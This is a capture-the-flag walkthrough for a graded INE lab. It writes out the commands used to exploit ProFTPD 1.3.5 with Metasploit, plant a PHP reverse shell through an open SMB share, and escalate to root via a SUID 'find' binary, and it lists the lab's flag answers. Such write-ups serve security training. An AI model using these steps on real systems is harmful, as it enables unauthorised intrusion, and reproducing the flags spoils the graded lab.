### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

Two machines are accessible at **target1.ine.local** and **target2.ine.local**. Enumerate the targets, identify and exploit the misconfigurations or vulnerabilities to capture the flags. The flag is in an md5 hash format.

- **Flag 1:** A vulnerable service maybe running on **target1.ine.local**. If exploitable, retrieve the flag from the root directory.
- **Flag 2:** Further, a quick interaction with a local network service on **target1.ine.local** may reveal this flag. Use the hint given in the previous flag.
- **Flag 3:** A misconfigured service running on **target2.ine.local** may help you gain access to the machine. Can you retrieve the flag from the root directory?
- **Flag 4:** Can you escalate to root on **target2.ine.local** and read the flag from the restricted /root directory?

# Tools

- Metasploit
- Nmap
- Python3
- Netcat
- smbmap
- smbclient
- Netstat

The first two questions are based on `target1.ine.local`, and the next two questions are based on `target2.ine.local`.

**Flag 1: A vulnerable service maybe running on target1.ine.local. If exploitable, retrieve the flag from the root directory.**

As usual, we start with an Nmap scan:

nmap -sC -sV target1.ine.local

![12bcbe4d5fd77f45aeceb0795ba3013d.png](../../../_resources/12bcbe4d5fd77f45aeceb0795ba3013d.png)

Only two services are running, and our task is to identify which one is vulnerable. Let’s begin by analyzing the FTP service, which is running version 1.3.5.

To search for any known exploits for this version, we can query the `searchsploit` database using the command: `searchsploit ProFTPD 1.3.5`

msfconsole

![e62db5e2383a3ae81e027fb05f241330.png](../../../_resources/e62db5e2383a3ae81e027fb05f241330.png)

search proftpd 1.3.5

We have identified this service as vulnerable, and an exploit is available in the Metasploit module which is `unix/ftp/proftpd_modcopy_exec`.

![99de5aeebab665344d3d4d6f5aeb0e1e.png](../../../_resources/99de5aeebab665344d3d4d6f5aeb0e1e.png)

Type `options` to list the parameters needed for the module.

![7a4e44b225ba5e4715a3ebf909508158.png](../../../_resources/7a4e44b225ba5e4715a3ebf909508158.png)

We need to set `SITEPATH` to `/var/www/html` because after navigating to the website, we found that the web root is located at `/var/www/html`.

Set the variables in `msfconsole` for `RHOSTS`, `LHOST`, and `SITEPATH` as follows:

set RHOSTS target1.ine.local

set LHOST 192.212.180.2

set SITEPATH /var/www/html

![76727a5dc2476dddc490bfb08ae62a0c.png](../../../_resources/76727a5dc2476dddc490bfb08ae62a0c.png)

![ee096e6d39743261e51f87821bf52198.png](../../../_resources/ee096e6d39743261e51f87821bf52198.png)

Type `run` to execute the exploit.

![d526b1fe132ea5fd5ce241ce4b3d3e8e.png](../../../_resources/d526b1fe132ea5fd5ce241ce4b3d3e8e.png)

As you can see, we have successfully created our session; type `sessions` to view it, and use `sessions -u 1` to upgrade it to Meterpreter.

![113fd633d76910165efa67a87c008dcd.png](../../../_resources/113fd633d76910165efa67a87c008dcd.png)

sessions -u 1

![797beb8083b5cef61fa1964e7aa92d13.png](../../../_resources/797beb8083b5cef61fa1964e7aa92d13.png)

To interact with the Meterpreter session, type `sessions -i 2`.

sessions -i 2

![af96664524d6bf542acc788ac49b7bc8.png](../../../_resources/af96664524d6bf542acc788ac49b7bc8.png)

As mentioned in the question, our flag is stored in the root directory. To retrieve it, type `cat /flag1.txt`. This gives us our first flag:

cat /flag1.txt

![7e69aa2e8116c889a06929845403cad8.png](../../../_resources/7e69aa2e8116c889a06929845403cad8.png)ls

FLAG1{0d04dc25b7084da0835a8fc963a084bb}

**Flag 2: Further, a quick interaction with a local network service on target1.ine.local may reveal this flag. Use the hint given in the previous flag.**

As mentioned in the question, we need to enumerate local services on the target; use `netstat -tuln 127.0.0.1` to view them.

netstat -tuln 127.0.0.1

![ffff9e32a462312fcf4546fc89a91e48.png](../../../_resources/ffff9e32a462312fcf4546fc89a91e48.png)

![16c813fbbb46c10d8c2fd0b34681b5fb.png](../../../_resources/16c813fbbb46c10d8c2fd0b34681b5fb.png)

Let’s interact with the service on port 8888 using `nc 127.0.0.1 8888`; to use the `nc` command, enter a shell by typing `shell` in the Meterpreter session, and to make it interactive, type

/bin/bash -i

![4c5c47f8bd4b78117c77ad666c30b356.png](../../../_resources/4c5c47f8bd4b78117c77ad666c30b356.png)

![8f27fc17be764db373518d23283a1379.png](../../../_resources/8f27fc17be764db373518d23283a1379.png)

Now, after running the command, it prompts for a passphrase. From the hint in `flag1.txt`, remember the three magical words "letmein" and use them to retrieve our second flag:

nc 127.0.0.1 8888

![10236f44c469463d7d820f7b2caed407.png](../../../_resources/10236f44c469463d7d820f7b2caed407.png)

FLAG2{48dab2715aee418e8ceeceb392507940}

Now these two question based on `target2.ine.local` .

**Flag 3: A misconfigured service running on target2.ine.local may help you gain access to the machine. Can you retrieve the flag from the root directory?**

As usual, we’ll start with `nmap` to see what services are running on `target2.ine.local` using the command

nmap -sC -sV -p- target2.ine.local -vvv

![b707aa723c37d79a8fc9d9b8a3a09fde.png](../../../_resources/b707aa723c37d79a8fc9d9b8a3a09fde.png)

![bebb59bbe8393b41bdef5efbd0927dc3.png](../../../_resources/bebb59bbe8393b41bdef5efbd0927dc3.png)

Since HTTP and SMB services are running, we can use `enum4linux` to enumerate the SMB service with the command: `enum4linux -a target2.ine.local`.

![2385196a87702b686410e9ce4a32061f.png](../../../_resources/2385196a87702b686410e9ce4a32061f.png)

![bbe15027a147b85a297a44c3c0643e6c.png](../../../_resources/bbe15027a147b85a297a44c3c0643e6c.png)

As you can see, there is one share with mapping and listing enabled; let’s connect t<span style="color: rgb(0, 0, 0);">o it using: smbclient [//target2.ine.local/site-uploads](//target2.ine.local/site-uploads)</span>  and enter a blank password when prompted.

![73395a697eecf52efb1e0d35b2ce15a8.png](../../../_resources/73395a697eecf52efb1e0d35b2ce15a8.png)

Now that we have access to `site-uploads`, meaning anything we upload here reflects on the website, let's upload our malicious file to the SMB server by copying the PHP shell with the command: `cp /usr/share/webshells/php/php-reverse-shell.php .`

![f2a03477db0723d60ca2de34436e621d.png](../../../_resources/f2a03477db0723d60ca2de34436e621d.png)

We can modify the IP and port by editing the file with the `nano` command: `nano php-reverse-shell.php`.

![88d31a30537d74bf3f8e1236d4e298f3.png](../../../_resources/88d31a30537d74bf3f8e1236d4e298f3.png)

![b0b380654f86a8c4847cf146c31afb20.png](../../../_resources/b0b380654f86a8c4847cf146c31afb20.png)

![fff4dd4c7e7b5fefb7f343f953a3c108.png](../../../_resources/fff4dd4c7e7b5fefb7f343f953a3c108.png)

Upload the file to SMB using the `put` command.

put php-reverse-shell.php

![4048009e1ed0101bf7bd5c2ca6bbb828.png](../../../_resources/4048009e1ed0101bf7bd5c2ca6bbb828.png)

Start a Netcat listener to receive the connection:

nc -nvlp 1234

![fd911ebde7484d469f50aa01a701d43f.png](../../../_resources/fd911ebde7484d469f50aa01a701d43f.png)

Open the browser and navigate to the location: `<ins>http://target2.ine.local/site-uploads/php-reverse-shell.php</ins>`<ins>.</ins>

http://target2.ine.local/site-uploads/php-reverse-shell.php

![7617fc5d501501c3147d2619b75ec7c4.png](../../../_resources/7617fc5d501501c3147d2619b75ec7c4.png)

And here we successfully got our connection in Netcat.

![3ab62d4da3fafbf7a6cf15065b75b549.png](../../../_resources/3ab62d4da3fafbf7a6cf15065b75b549.png)

As mentioned, the flag is located in the root directory; let’s navigate to it using the command: `cat /flag3.txt`.![fc83cdd88026087cc78bba9b40ed552a.png](../../../_resources/fc83cdd88026087cc78bba9b40ed552a.png)

![6e76055886563e3749386267d94b8486.png](../../../_resources/6e76055886563e3749386267d94b8486.png)

FLAG4{0397ddd492fd4c1994424079a03e5b1d}

==**Flag 4: Can you escalate to root on target2.ine.local and read the flag from the restricted /root directory?**==

We will start by checking the shells available on the system using the command:

cat /etc/shells

![7b12b985ae400a38849665f7f2e1c3ea.png](../../../_resources/7b12b985ae400a38849665f7f2e1c3ea.png)

To check the permissions each shell has, use the command: cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done.

**Note:** The command `cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done` reads each shell listed in `/etc/shells`, checks its permissions using `ls -l`, and suppresses any errors (e.g., inaccessible files) with `2>/dev/null`.

![7133b62a75b40fcc4da9ed56b184cbbc.png](../../../_resources/7133b62a75b40fcc4da9ed56b184cbbc.png)

It means we can use any shell with the permission `lrwxrwxrwx` for escalation.

Now, to check for executables with the SetUID bit set that can run with root privileges, use the command: `find / -perm -4000 2>/dev/null`.

**Note:** The command find / -perm -4000 2>/dev/null does the following

- `find /`: Starts searching from the root directory `/`.
- `-perm -4000`: Looks for files with the SetUID permission bit set. This allows users to execute the file with the permissions of the file's owner.
- `2>/dev/null`: Suppresses error messages (e.g., permission denied messages) by redirecting them to `/dev/null`, effectively ignoring them.

![83fd6b060db957a644fe7f4edb87bdf7.png](../../../_resources/83fd6b060db957a644fe7f4edb87bdf7.png)

When conducting privilege escalation, identifying SetUID (Set User ID) binaries is critical, as they allow executables to run with the permissions of their owner — often root. By searching for these binaries using the `find` command with the `-perm -4000` flag, we can identify files that may be exploited.

==By combining the== ==`find`== ==command with an executable like== ==`/bin/sh`====or== ==`/bin/rbash`====, we can spawn a new shell with root privileges:==

find / -exec /bin/rbash -p \\; -quit

![e9699665ef8bdcb62a37667665797909.png](../../../_resources/e9699665ef8bdcb62a37667665797909.png)

![2d631ebb9bfbbdc5a064ba8f3f4b15a6.png](../../../_resources/2d631ebb9bfbbdc5a064ba8f3f4b15a6.png)

After successfully elevating our privileges to root, we can run the `whoami` command to confirm. Since the last flag is located in the root directory, we can obtain it by using the command:

cat root/flag4.txt

![9c9c83ab6c8fd245b065d4b1e3d849ee.png](../../../_resources/9c9c83ab6c8fd245b065d4b1e3d849ee.png)

![fa168c04b7dc026e4cb368b5101484ff.png](../../../_resources/fa168c04b7dc026e4cb368b5101484ff.png)

FLAG4{b03db9977c474e0eb5720dc276517328}